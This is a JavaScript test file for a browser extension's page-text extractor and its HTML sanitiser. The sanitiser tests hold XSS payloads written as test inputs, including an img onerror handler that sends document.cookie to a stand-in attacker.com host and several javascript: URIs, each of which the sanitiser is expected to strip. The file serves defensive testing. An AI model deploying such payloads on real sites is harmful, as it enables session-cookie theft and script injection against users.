/**
 * tests/extension-dom-security.test.js
 * ────────────────────────────────────
 * Automated unit and security tests for:
 *  1. extension/content.js (DOM parsing, boilerplate stripping, whitespace normalisation)
 *  2. extension/popup.js sanitiseHtml() (XSS vector prevention, safe HTML preservation)
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { JSDOM } from 'jsdom';

// ── DOM Extraction logic extracted from extension/content.js ──────────────────
function extractContentFromDOM(dom) {
  const { document, window } = dom.window;
  const MAX_CHARS = 40_000;

  const NOISE_TAGS = [
    'script', 'style', 'noscript', 'iframe', 'svg', 'canvas',
    'video', 'audio', 'picture', 'figure', 'form',
  ];

  const NOISE_SELECTORS = [
    'nav', 'header', 'footer',
    '[role="navigation"]', '[role="banner"]', '[role="complementary"]',
    '.cookie-banner', '.cookie-notice', '#cookie-banner',
    '.ad', '.advertisement', '.sidebar', '.widget',
    '[aria-hidden="true"]',
  ];

  const clone = document.body.cloneNode(true);
  const allNoise = [...NOISE_TAGS, ...NOISE_SELECTORS].join(', ');
  clone.querySelectorAll(allNoise).forEach((el) => el.remove());

  const CONTENT_SELECTORS = [
    'article',
    'main',
    '[role="main"]',
    '.post-content',
    '.article-body',
    '.entry-content',
    '#content',
    '#main',
  ];

  let contentRoot = null;
  let usedMainContent = false;

  for (const selector of CONTENT_SELECTORS) {
    const el = clone.querySelector(selector);
    if (el && el.textContent && el.textContent.trim().length > 200) {
      contentRoot = el;
      usedMainContent = true;
      break;
    }
  }

  if (!contentRoot) {
    contentRoot = clone;
  }

  const rawText = contentRoot.textContent || '';
  const normalised = rawText
    .replace(/\r\n/g, '\n')
    .replace(/[ \t]+/g, ' ')
    .replace(/\n{3,}/g, '\n\n')
    .trim();

  const text = normalised.slice(0, MAX_CHARS);

  return {
    text,
    characterCount: text.length,
    usedMainContent,
    pageTitle: document.title,
    pageUrl: window.location.href,
  };
}

// ── Sanitisation logic from extension/popup.js ────────────────────────────────
function sanitiseHtml(html, window) {
  const { document } = window;
  const template = document.createElement('template');
  template.innerHTML = html;
  const root = template.content;

  root.querySelectorAll('script, iframe, object, embed, form, input').forEach((el) => el.remove());

  root.querySelectorAll('*').forEach((el) => {
    for (const attr of [...el.attributes]) {
      if (attr.name.startsWith('on')) {
        el.removeAttribute(attr.name);
      }
    }

    for (const attrName of ['href', 'src', 'action']) {
      const val = el.getAttribute(attrName);
      if (val && /^\s*(javascript|data|vbscript):/i.test(val)) {
        el.removeAttribute(attrName);
      }
    }
  });

  const div = document.createElement('div');
  div.appendChild(root.cloneNode(true));
  return div.innerHTML;
}

describe('Frontend: DOM Content Extraction (content.js)', () => {
  it('extracts clean text and ignores navigation, scripts, ads, and footers', () => {
    const html = `
      <!DOCTYPE html>
      <html>
        <head><title>Test Article</title></head>
        <body>
          <nav><a>Home</a><a>About</a></nav>
          <header><h1>Site Banner</h1></header>
          <div class="cookie-banner">Please accept all cookies!</div>
          <div class="ad">Buy our product now!</div>
          <article>
            <h2>Understanding Node.js</h2>
            <p>Node.js is an open-source, cross-platform JavaScript runtime environment.</p>
          </article>
          <script>console.log("malicious or tracking script");</script>
          <style>body { background: red; }</style>
          <footer>Copyright 2026</footer>
        </body>
      </html>
    `;

    const dom = new JSDOM(html, { url: 'https://example.com/article' });
    const result = extractContentFromDOM(dom);

    assert.ok(result.text.includes('Understanding Node.js'));
    assert.ok(result.text.includes('JavaScript runtime environment'));
    assert.ok(!result.text.includes('Buy our product now!'), 'Ads should be stripped');
    assert.ok(!result.text.includes('Please accept all cookies!'), 'Cookie banner should be stripped');
    assert.ok(!result.text.includes('tracking script'), 'Script tags should be stripped');
    assert.ok(!result.text.includes('Site Banner'), 'Header should be stripped');
    assert.ok(!result.text.includes('Copyright 2026'), 'Footer should be stripped');
  });

  it('normalizes excessive horizontal whitespace and runs of blank lines', () => {
    const html = `
      <!DOCTYPE html>
      <html>
        <body>
          <p>Word1     Word2          Word3</p>
          \n\n\n\n\n\n
          <p>Next Paragraph</p>
        </body>
      </html>
    `;

    const dom = new JSDOM(html);
    const result = extractContentFromDOM(dom);

    assert.ok(!result.text.includes('     '), 'Multiple spaces should be collapsed');
    assert.ok(result.text.includes('Word1 Word2 Word3'));
  });

  it('handles empty or nearly empty pages gracefully', () => {
    const html = `<!DOCTYPE html><html><body><nav>Only nav</nav></body></html>`;
    const dom = new JSDOM(html);
    const result = extractContentFromDOM(dom);

    assert.equal(result.text, '');
    assert.equal(result.characterCount, 0);
  });

  it('enforces maximum character limit cap', () => {
    const hugeText = 'a'.repeat(60_000);
    const html = `<!DOCTYPE html><html><body><p>${hugeText}</p></body></html>`;
    const dom = new JSDOM(html);
    const result = extractContentFromDOM(dom);

    assert.ok(result.characterCount <= 40_000, 'Must not exceed 40,000 characters');
    assert.equal(result.text.length, 40_000);
  });
});

describe('Frontend: Security & XSS Sanitization (popup.js sanitiseHtml)', () => {
  const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');

  it('removes executable <script> tags', () => {
    const malicious = '<p>Normal</p><script>alert("XSS")</script>';
    const cleaned = sanitiseHtml(malicious, dom.window);
    assert.ok(!cleaned.includes('<script'), 'Script tag must be stripped');
    assert.ok(!cleaned.includes('alert('), 'Script contents should not remain executable');
    assert.ok(cleaned.includes('<p>Normal</p>'));
  });

  it('strips inline event handlers (onerror, onload, onclick, onmouseover)', () => {
    const malicious = `
      <img src="invalid.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
      <button onclick="badCode()">Click</button>
      <div onmouseover="hack()">Hover</div>
    `;
    const cleaned = sanitiseHtml(malicious, dom.window);
    assert.ok(!cleaned.includes('onerror='), 'onerror attribute must be removed');
    assert.ok(!cleaned.includes('onclick='), 'onclick attribute must be removed');
    assert.ok(!cleaned.includes('onmouseover='), 'onmouseover attribute must be removed');
    assert.ok(!cleaned.includes('attacker.com'), 'Payload URL inside event handler stripped');
  });

  it('blocks javascript: and vbscript: URIs in links and src', () => {
    const malicious = `
      <a href="javascript:alert('XSS')">Dangerous Link</a>
      <a href="javascript:void(0)">Void Link</a>
      <iframe src="javascript:alert(1)"></iframe>
    `;
    const cleaned = sanitiseHtml(malicious, dom.window);
    assert.ok(!cleaned.includes('javascript:'), 'javascript: URLs must be stripped');
    assert.ok(!cleaned.includes('<iframe'), 'iframe must be removed');
  });

  it('preserves legitimate formatting (code blocks, headings, bold, lists)', () => {
    const safeHtml = `
      <h3>Code Example</h3>
      <p>Here is <strong>important</strong> text and a <a href="https://example.com">safe link</a>.</p>
      <pre><code>function hello() { return 42; }</code></pre>
      <ul><li>Item 1</li><li>Item 2</li></ul>
    `;
    const cleaned = sanitiseHtml(safeHtml, dom.window);
    assert.ok(cleaned.includes('<h3>Code Example</h3>'));
    assert.ok(cleaned.includes('<strong>important</strong>'));
    assert.ok(cleaned.includes('href="https://example.com"'));
    assert.ok(cleaned.includes('<code>function hello()'));
    assert.ok(cleaned.includes('<li>Item 1</li>'));
  });
});
